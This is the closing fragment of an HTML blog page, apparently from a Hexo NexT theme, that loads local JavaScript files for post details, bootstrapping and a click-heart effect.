<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>



  


  




	





  





  






  





  

  

  

  

  

  

</body>
</html>

<!-- 页面点击小红心 -->
<script type="text/javascript" src="/js/src/love.js"></script>